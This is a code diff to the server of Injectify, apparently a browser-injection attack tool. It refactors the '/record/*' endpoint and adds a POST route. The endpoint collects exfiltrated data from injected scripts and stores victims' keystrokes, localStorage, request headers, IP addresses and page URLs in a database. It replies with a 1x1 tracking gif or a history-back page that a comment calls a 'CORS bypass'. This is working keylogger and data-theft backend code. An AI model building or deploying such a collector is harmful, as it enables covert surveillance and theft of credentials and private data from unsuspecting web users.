@@ -28,6 +28,7 @@ const ObfuscateJS	= require('js-obfuscator')
 const reverse		= require('reverse-string')
 const escapeUTF8	= require('unicode-escape')
 const parseAgent	= require('user-agent-parser')
+const bodyParser	= require('body-parser')
 
 console.log(chalk.greenBright("[Injectify] ") + "listening on port " + config.express)
 
@@ -528,8 +529,11 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		})
 	})
 
-	app.get('/record/*', (req, res) => {
-		var validate = base64 => {
+	// Tell express to use the body-parser middleware and to not parse extended bodies
+	app.use(bodyParser.urlencoded({ extended: false }))
+
+	let recordAPI = (req, res, headers) => {
+		let validate = base64 => {
 			return new Promise((resolve, reject) => {
 				if (typeof base64 === "string") {
 					try {
@@ -543,7 +547,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				}
 			})
 		}
-		var Record = record => {
+		let Record = record => {
 			return new Promise((resolve, reject) => {
 				let project			= "a",
 					type			= "t",
@@ -589,7 +593,7 @@ MongoClient.connect(config.mongodb, function(err, db) {
 									}
 								}
 								try {
-									var ip = req.headers['x-forwarded-for'].split(',')[0]
+									var ip = headers['x-forwarded-for'].split(',')[0]
 								} catch(e) {
 									var ip = getIP(req.connection.remoteAddress)
 								}
@@ -639,8 +643,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 													browser: {
 														width		: record[width],
 														height		: record[height],
-														'user-agent': parseAgent(req.headers["user-agent"]),
-														headers		: req.headers
+														'user-agent': parseAgent(headers["user-agent"]),
+														headers		: headers
 													},
 													storage : {
 														local	: record[localStorage],
@@ -706,8 +710,8 @@ MongoClient.connect(config.mongodb, function(err, db) {
 																	href: record[url]
 																},
 																browser: {
-																	headers		: req.headers,
-																	'user-agent': parseAgent(req.headers["user-agent"])
+																	headers		: headers,
+																	'user-agent': parseAgent(headers["user-agent"])
 																},
 																keys : [
 																	keystrokes
@@ -738,9 +742,10 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		}
 		let path
 		if(req.path.slice(-1) == "$") {
+			// CORS bypass option enabled
 			path = req.path.substring(1).split(/\/(.+)?/, 2)[1].slice(0, -1)
 			res.set('Content-Type', 'text/html')
-			   .send("<script>window.history.back()</script>")
+			.send("<script>window.history.back()</script>")
 		} else {
 			path = req.path.substring(1).split(/\/(.+)?/, 2)[1]
 			// Send a 1x1px gif
@@ -750,9 +755,9 @@ MongoClient.connect(config.mongodb, function(err, db) {
 				0x01,0x00, 0x01,0x00, 0x00,0x02, 0x02,0x44, 0x01,0x00, 0x3b
 			]
 			res.set('Content-Type', 'image/gif')
-			   .set('Content-Length', data.length)
-			   .status(200)
-			   .send(new Buffer(data))
+			.set('Content-Length', data.length)
+			.status(200)
+			.send(new Buffer(data))
 		}
 		validate(path).then(record => {
 			Record(record).then(message => {
@@ -769,6 +774,14 @@ MongoClient.connect(config.mongodb, function(err, db) {
 		}).catch(error => {
 			if (config.debug) console.log(chalk.redBright("[record] ") + chalk.yellowBright(error));
 		})
+	}
+
+	app.get('/record/*', (req, res) => {
+		recordAPI(req, res, req.headers)
+	})
+
+	app.post('/record/*', (req, res) => {
+		recordAPI(req, res, req.body)
 	})
 
 	app.get('/api/*', (req, res) => {
